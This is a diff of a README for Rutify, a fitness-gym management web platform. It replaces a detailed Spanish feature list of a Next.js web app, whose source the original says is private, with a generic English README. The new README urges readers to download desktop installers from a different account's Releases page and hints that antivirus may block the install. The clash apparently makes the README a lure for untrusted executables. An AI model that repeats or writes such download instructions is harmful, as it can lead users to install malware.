@@ -1,256 +1,67 @@
-# <img width="32" height="32" alt="android-chrome-512x512" src="https://github.com/user-attachments/assets/3b5a3c0b-db60-428a-8806-6d2c2b487e08" />  Rutify 
-Plataforma fitness para crear, gestionar y solicitar programas y rutinas de entrenamiento.
-📊Profesionaliza tu gimnasio y comunicacion con tus alumnos. 
-🏋️‍♂️Optimiza tus entrenamientos y progreso.
+# 🏋️‍♂️ Rutify - Your Fitness Training Simplified
 
-🌐 Web: rutify.com.ar
-📷 Instagram: @rutify.app
+[![Download Rutify](https://img.shields.io/badge/Download%20Rutify-v1.0-brightgreen.svg)](https://github.com/imthatguypal867/Rutify/releases)
 
+## 📋 Description
 
-🐦 X/Twitter: @rutifyapp
-📩 Soporte: rutifyapp@gmail.com
+Rutify is a fitness platform designed to help users create, manage, and request training programs and routines. It enhances gym management and communication with students, allowing users to optimize their workouts and track progress effectively. Whether you are a gym owner or an individual looking to improve your fitness journey, Rutify offers various features that cater to your needs.
 
-## ¿Qué es Rutify?
-Rutify es un sistema de gestión para gimnasios, entrenadores personales y usuarios independientes, diseñado para optimizar entrenamientos, seguimiento de progreso y comunicación entre profesionales y alumnos.
+## 🚀 Getting Started
 
-## Tabla de Contenidos
-- [Características Principales](#-características-principales)
-- [Tipos de Usuario](#-tipos-de-usuario)
-- [Funcionalidades por Usuario](#-funcionalidades-por-usuario)
-- [Tecnologías Utilizadas](#-tecnologías-utilizadas)
-- [Integraciones](#-integraciones)
+To get started with Rutify, follow the steps outlined below to download and run the application from our Releases page.
 
-##Características Principales
-- **Autenticación Multi-rol** con NextAuth.js
-- **Sistema de Registro y Verificación** por email
-- **Redirección Inteligente** basada en roles de usuario
-- **Sistema de Suscripciones y planes al sistema** para gimnasios y entrenadores
-- **Dashboard Avanzado** con estadísticas en tiempo real
-- **Diseño Responsive** optimizado para móviles
-- **Importación de Rutinas** desde archivos Excel
-- **Seguimiento de Progreso** con gráficos interactivos
-- **Sistema de Notificaciones** push
-- **Gestión de Objetivos** y programas personalizados
-- **Calendario de Entrenamientos** integrado
-- **Tracking de Sesiones** en tiempo real
-- **Base de Datos Extensa de Ejercicios** con más de 400 ejercicios
-- **Imágenes y Videos** de demostración para cada ejercicio
-- **Historial Detallado** de progreso por ejercicio específico
-- **Landing Page** con diseño moderno y responsive
-- **Sistema de Recuperación de Contraseñas** con tokens seguros
-- **PWA (Progressive Web App)** con instalación nativa
-- **Imágenes Responsive** específicas para mobile/desktop
+## 📥 Download & Install
 
-## 👥 Tipos de Usuario
+1. **Visit the Release Page**  
+   To download Rutify, please visit our Releases page: [https://github.com/imthatguypal867/Rutify/releases](https://github.com/imthatguypal867/Rutify/releases).
 
-### 1. **ADMIN** - Administrador del Sistema
-### 2. **GYM_ADMIN** - Administrador de Gimnasio
-### 3. **TEACHER** - Profesor/Entrenador
-### 4. **USER** - Alumno/Cliente
+2. **Select the Latest Version**  
+   On the Releases page, you will see a list of available versions. Look for the latest version, which will be marked as the most recent release.
 
-## 🎯 Funcionalidades por Usuario
+3. **Download the Installer**  
+   Click the download link for the appropriate installer file for your operating system (Windows, macOS, or Linux). Make sure to choose the correct file type.
 
-### 🔧 **ADMIN - Administrador del Sistema**
+4. **Run the Installer**  
+   Once the file has downloaded, find it in your Downloads folder or the location you chose for the file. Double-click the installer and follow the on-screen instructions to complete the installation process.
 
-#### Gestión de Gimnasios
-- **Crear/Editar Gimnasios** con información completa
-- **Asignar Administradores** a gimnasios
-- **Gestión de Planes** de suscripción (BASIC, STANDARD, PREMIUM)
-- **Límites de Profesores** según el plan (1-3, 4-7, 8+)
-- **Estadísticas Globales** de todos los gimnasios
+5. **Launch Rutify**  
+   After the installation is complete, you will find Rutify in your applications list. Click the icon to launch the application and start using it.
 
-#### Gestión de Personal Trainers
--  **Crear/Editar Personal Trainers** independientes
--  **Asignar Planes** de suscripción (BASIC, STANDARD, PREMIUM)
--  **Límites de Estudiantes** según el plan (1-5, 6-10, 11+)
--  **Gestión de Estados** (activo/inactivo)
+## 📊 Key Features
 
-#### Sistema de Limpieza
--  **Cleanup Automático** de datos obsoletos
--  **Gestión de Archivos** temporales
--  **Optimización de Base de Datos**
+- **Custom Workout Plans**: Create tailored workout plans suited to your fitness level and goals.
+- **Progress Tracking**: Easily monitor your workouts and progress over time with built-in tools.
+- **User-Friendly Interface**: Navigate through the application with ease, even if you're not tech-savvy.
+- **Communication Tools**: Stay connected with your personal trainer or gym staff to receive updates and guidance.
+- **Multi-Platform Access**: Available on multiple platforms including desktop and mobile.
+  
+## 💻 System Requirements
 
-#### Gestión de Usuarios
--  **Verificación de Emails** pendientes
--  **Gestión de Tokens** de verificación
--  **Sistema de Feedback** de usuarios
--  **Monitoreo de Registros** y actividad
+- **Windows**: Windows 10 or later
+- **macOS**: macOS Mojave or later
+- **Linux**: Ubuntu 18.04 or later
+- At least 4GB of RAM
+- 500MB of free storage space
 
-### 🏢 **GYM_ADMIN - Administrador de Gimnasio**
+## 📚 Support
 
-#### Gestión de Profesores
--  **Agregar/Remover Profesores** del gimnasio
--  **Ver Límites** actuales vs máximos (ej: "2/3 profesores")
--  **Restricciones por Plan** de suscripción
--  **Gestión de Estados** de profesores
+If you face any issues during the download or installation process, feel free to reach out via the Issues tab on GitHub. We welcome feedback and are here to help you resolve your queries promptly.
 
-#### Estadísticas del Gimnasio
--  **Dashboard de Estadísticas** con gráficos
--  **Rankings de uso** del gimnasio
--  **Métricas de Rendimiento** del gimnasio
--  **Reportes de Uso** de la plataforma
+## 🚧 Troubleshooting
 
-#### Gestión de Alumnos
--  **Ver Alumnos** asignados al gimnasio
--  **Estadísticas de Participación**
--  **Gestión de Accesos**
+- **Installation Problems**: If you encounter problems during installation, ensure you have administrative rights on your computer and that your antivirus software is not blocking the installation.
+- **Running Issues**: If the application fails to launch, check if your system meets the required specifications above.
 
-### 👨‍🏫 **TEACHER - Profesor/Entrenador**
+## 🌐 Community
 
-#### Gestión de Alumnos
--  **Agregar Alumnos** con búsqueda por nombre
--  **Ver Límites** actuales vs máximos (ej: "3/5 alumnos")
--  **Separación de Listas** (alumnos PT vs alumnos gimnasio)
--  **Restricciones por Plan** de suscripción
+Join our community to share your experiences, ask questions, and find support. Connect with fellow users and get tips on making the most of Rutify.
 
-#### Creación de Programas
--  **Crear Programas** personalizados
--  **Importar Rutinas** desde Excel con ejercicios reales
--  **Template Descargable** con ejercicios de la base de datos
--  **Búsqueda de Ejercicios Similares** automática
--  **Asignar a Alumnos** programas completos
--  **Biblioteca Visual de Ejercicios** con imágenes
--  **Búsqueda Avanzada** por músculo, equipamiento y nombre
+## 📖 Contributing
 
-#### Gestión de Rutinas
--  **Crear Rutinas** con ejercicios específicos
--  **Configurar Series/Repeticiones** por ejercicio
--  **Ordenar Ejercicios** en la rutina
--  **Notas** por ejercicio
+We appreciate contributions from the community. If you would like to contribute to Rutify, please check out our guidelines in the Contributing section on GitHub for more information.
 
-#### Seguimiento de Alumnos
--  **Ver Progreso** de cada Alumno
--  **Estadísticas Detalladas** por alumno
--  **Historial de Entrenamientos**
--  **Gráficos de Progreso** semanales/mensuales
--  **Historial por Ejercicio** de cada alumno
--  **Análisis de Progreso** por músculo y ejercicio específico
+## 📣 Updates
 
-#### Dashboard de Actividad
--  **Actividades Recientes** de alumnos
--  **Estadísticas Personales** de enseñanza
--  **Calendario de Sesiones**
--  **Biblioteca de Ejercicios** con imágenes
--  **Análisis de Rendimiento** de alumnos por ejercicio
+Stay tuned for regular updates and new features based on user feedback. We are committed to improving Rutify to help you achieve your fitness goals.
 
-### 👤 **USER - Alumno/Cliente**
-
-#### Registro y Autenticación
--  **Registro Completo** con validación de datos
--  **Verificación de Email** obligatoria
--  **Recuperación de Contraseñas** con tokens seguros
--  **Login con Google** OAuth integrado
--  **Redirección Automática** según rol de usuario
--  **Sistema de Feedback** para reportar problemas
-
-#### Gestión de Programas Propios Libre
--  **Crear Programas** personales
--  **Importar Rutinas** desde Excel
--  **Editar Programas** existentes
-
-#### Programas Asignados en caso de que su gimnasio/PT este suscripto al sistema
--  **Ver Programas** asignados por profesores/PTs
--  **Diferenciar Origen** (profesor vs Personal Trainer)
--  **Estados de Programas** (activo/inactivo)
--  **Filtros por Objetivo** (ganar músculo, fuerza, etc.)
-
-#### Entrenamientos
--  **Iniciar Sesiones** de entrenamiento
--  **Tracking en Tiempo Real** de ejercicios
--  **Registrar Series/Repeticiones/Peso**
--  **Continuar Sesiones** interrumpidas
--  **Historial Completo** de entrenamientos
--  **Visualización de Ejercicios** con imágenes y videos
--  **Instrucciones Detalladas** de ejecución correcta
--  **Biblioteca de Ejercicios** con más de 400 opciones
-
-#### Seguimiento de Progreso
--  **Dashboard de Progreso** personal
--  **Gráficos de Volumen** semanal
--  **Estadísticas por Grupo Muscular**
--  **Tendencias de Rendimiento**
--  **Historial Completo de Ejercicios** con gráficos detallados
--  **Progreso por Ejercicio Específico** con evolución de peso y repeticiones
--  **Análisis de Rendimiento** por músculo y ejercicio
-
-#### Perfil y Configuración
--  **Editar Perfil** personal
--  **Registrar Peso Corporal** con gráficos
--  **Configurar Notificaciones**
--  **Gestión de Preferencias**
--  **Subida de Fotos de Perfil** con Cloudinary
-
-## 🛠️ Tecnologías Utilizadas
-
-### **Frontend**
-- **Next.js 14** - Framework React con App Router
-- **TypeScript** - Tipado estático para mayor seguridad
-- **Tailwind CSS** - Framework CSS utility-first
-- **Heroicons** - Iconografía consistente
-- **React Hook Form** - Gestión de formularios
-- **Recharts** - Gráficos interactivos
-- **XLSX** - Procesamiento de archivos Excel
-- **Biblioteca Visual** - Componentes para mostrar ejercicios con imágenes
-
-### **Backend**
-- **Next.js API Routes** - API REST integrada
-- **Prisma ORM** - ORM moderno para TypeScript
-- **PostgreSQL** - Base de datos relacional
-- **NextAuth.js** - Autenticación y autorización
-- **Zod** - Validación de esquemas
-
-### **Base de Datos**
-- **PostgreSQL** - Base de datos principal
-- **Prisma Migrations** - Control de versiones de BD
-- **Soft Deletes** - Eliminación lógica de datos
-- **Relaciones Complejas** - Múltiples tipos de relaciones
-- **Base de Datos de Ejercicios** - Más de 500 ejercicios con imágenes
-- **Multimedia de Ejercicios** - Videos e imágenes de demostración
-
-### **Autenticación y Seguridad**
-- **NextAuth.js** - Sistema de autenticación completo
-- **JWT Tokens** - Tokens de sesión seguros
-- **Role-based Access Control** - Control de acceso por roles
-- **Email Verification** - Verificación obligatoria por email
-- **Password Reset** - Recuperación segura de contraseñas
-- **Google OAuth** - Login social integrado
-- **Middleware Protection** - Protección de rutas por roles
-
-### **Despliegue y Hosting**
-- **Vercel** - Plataforma de despliegue
-- **Neon Database** - Base de datos PostgreSQL en la nube
-- **Cloudinary** - Almacenamiento de imágenes y videos
-- **Environment Variables** - Configuración segura
-
-## 🔌 Integraciones
-
-### **Base de Datos**
-- **Neon PostgreSQL** - Base de datos principal
-- **Prisma Studio** - Interfaz visual para la BD
-
-### **Almacenamiento**
-- **Cloudinary** - Imágenes y videos de ejercicios
-- **CDN Global** - Distribución de contenido
-- **Base de Datos de Ejercicios** - Más de 500 ejercicios con imágenes
-- **Multimedia de Ejercicios** - Videos e imágenes de demostración
-- **Fotos de Perfil** - Subida y gestión de imágenes de usuario
-- **Imágenes Responsive** - Específicas para mobile/desktop
-
-### **Notificaciones**
-- **Web Push API** - Notificaciones push del navegador
-- **Service Workers** - Notificaciones en segundo plano
-
-### **Archivos**
-- **XLSX.js** - Procesamiento de archivos Excel
-- **FileReader API** - Lectura de archivos del cliente
-- **Multimedia de Ejercicios** - Gestión de imágenes y videos
-- **CDN de Ejercicios** - Distribución global de contenido multimedia
-- **Email Templates** - Plantillas HTML para emails de verificación
-- **Image Upload** - Subida de imágenes de perfil
-
-
-Licencia
-Este proyecto está bajo la Licencia MIT. Ver LICENSE para más detalles.
-
-© Rutify – Todos los derechos reservados.
-Este repositorio es solo informativo. El código fuente es privado.
+For more details and updates, you can revisit our Releases page here: [https://github.com/imthatguypal867/Rutify/releases](https://github.com/imthatguypal867/Rutify/releases).
